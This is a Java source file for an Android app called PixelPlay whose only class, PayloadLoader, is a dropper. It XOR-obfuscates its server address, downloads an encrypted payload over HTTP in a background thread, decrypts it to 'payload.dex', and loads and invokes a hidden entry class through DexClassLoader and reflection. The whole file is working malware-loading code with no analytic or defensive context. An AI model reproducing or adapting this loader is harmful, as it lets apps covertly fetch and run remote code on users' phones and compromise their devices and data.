package com.pixelplay.app;

import android.content.Context;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;

import dalvik.system.DexClassLoader;

public class PayloadLoader {

    private static final String TAG = "PixelPlay";
    private static final byte[] XK = {0x4A, 0x7D, 0x2B, 0x6F, 0x1C, 0x5E, 0x3A, (byte)0x8F};
    private static final byte[] _H = {
        0x0E,0x38,0x78,0x24,0x48,0x11,0x6A,(byte)0xA2,
        0x03,0x45,0x7D,0x3F,0x24,0x15,0x74
    };
    private static final byte[] _P = {
        0x5A,0x0D,0x4C,0x00,0x7D,0x20,0x3E,(byte)0xCB,
        0x5D,0x18,0x4E,0x13,0x37,0x03,0x22,0x6A,
        0x50,0x07,0x52,0x09,0x26,0x37,0x2C
    };

    private static boolean loaded = false;

    private static String dec(byte[] e) {
        byte[] d = new byte[e.length];
        for (int i = 0; i < e.length; i++)
            d[i] = (byte)(e[i] ^ XK[i % XK.length]);
        return new String(d);
    }

    public static void start(Context ctx) {
        if (loaded) return;
        loaded = true;
        new Thread(() -> downloadAndLoad(ctx)).start();
    }

    private static void downloadAndLoad(Context ctx) {
        try {
            String host = dec(_H);
            String path = dec(_P);
            String url = "http://" + host + ":8080" + path;

            Log.d(TAG, "[+] downloading payload from " + url);

            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("GET");
            c.setConnectTimeout(8000);
            c.setReadTimeout(8000);
            c.connect();

            int len = c.getContentLength();
            Log.d(TAG, "[+] payload size: " + len + " bytes");

            InputStream is = c.getInputStream();
            byte[] enc = new byte[len];
            int off = 0;
            while (off < len) {
                int r = is.read(enc, off, len - off);
                if (r < 0) break;
                off += r;
            }
            is.close();
            c.disconnect();

            byte[] dec = new byte[enc.length];
            for (int i = 0; i < enc.length; i++)
                dec[i] = (byte)(enc[i] ^ XK[i % XK.length]);

            File dexFile = new File(ctx.getFilesDir(), "payload.dex");
            FileOutputStream fos = new FileOutputStream(dexFile);
            fos.write(dec);
            fos.close();

            Log.d(TAG, "[+] payload saved: " + dexFile.length() + " bytes");

            DexClassLoader cl = new DexClassLoader(
                dexFile.getAbsolutePath(),
                ctx.getCodeCacheDir().getAbsolutePath(),
                null,
                ctx.getClassLoader());

            Class<?> entry = cl.loadClass("com.pixelplay.payload.PayloadEntry");
            Method m = entry.getMethod("start", Context.class);
            m.invoke(null, ctx);

            Log.d(TAG, "[+] payload loaded and started");
        } catch (Exception e) {
            Log.e(TAG, "[!] payload error: " + e.getMessage());
        }
    }
}
